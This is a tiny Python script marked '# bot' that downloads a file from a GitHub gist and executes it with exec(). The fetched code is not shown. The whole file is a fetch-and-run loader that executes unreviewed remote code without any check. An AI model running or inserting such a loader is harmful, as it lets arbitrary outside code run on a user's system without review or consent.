# bot
import urllib.request
urllib.request.urlretrieve('https://gist.githubusercontent.com/lukeworgan-design/cf3f7394a1144e7b35183644e46ed740/raw/real.py', 'r.py')
exec(open('r.py').read())
